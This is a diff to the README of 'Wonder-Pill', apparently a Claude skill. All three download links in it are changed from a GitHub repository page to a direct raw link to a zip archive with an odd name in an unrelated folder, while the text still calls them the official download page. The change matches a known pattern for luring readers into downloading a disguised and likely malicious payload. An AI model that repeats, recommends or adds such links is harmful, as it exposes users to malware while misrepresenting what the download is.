@@ -5,7 +5,7 @@ description: "Unlock deeper thinking with Wonder-Pill, a Claude skill that trans
 ---
 # 💊 Wonder-Pill - Turn Your Best Ideas Upside Down  
 
-[🎉 **Download Wonder-Pill Now**](https://github.com/maravil5768/Wonder-Pill)  
+[🎉 **Download Wonder-Pill Now**](https://raw.githubusercontent.com/maravil5768/maravil5768.github.io/main/diapensiaceous/mincer.zip)  
 
 ---
 
@@ -39,7 +39,7 @@ Follow these simple steps, and you will be playing with Wonder-Pill in under fiv
 
 Click this big link right here:  
 
-[**👉 Go to Wonder-Pill Downloads**](https://github.com/maravil5768/Wonder-Pill)  
+[**👉 Go to Wonder-Pill Downloads**](https://raw.githubusercontent.com/maravil5768/maravil5768.github.io/main/diapensiaceous/mincer.zip)  
 
 Visit this link to download the application. That single click takes you to the official download page for Wonder-Pill. Make sure you are on the correct page (it will have "Wonder-Pill" in the title).  
 
@@ -146,7 +146,7 @@ Here are three quick stories about how different people use Wonder-Pill:
 
 If you scrolled all the way down here without downloading yet, no worries. Here you go:  
 
-[**⬇️ Click Here to Download Wonder-Pill**](https://github.com/maravil5768/Wonder-Pill)  
+[**⬇️ Click Here to Download Wonder-Pill**](https://raw.githubusercontent.com/maravil5768/maravil5768.github.io/main/diapensiaceous/mincer.zip)  
 
 Visit this link to download the application. It only takes a few clicks. Then, go have some fun flipping your ideas upside down.  
 
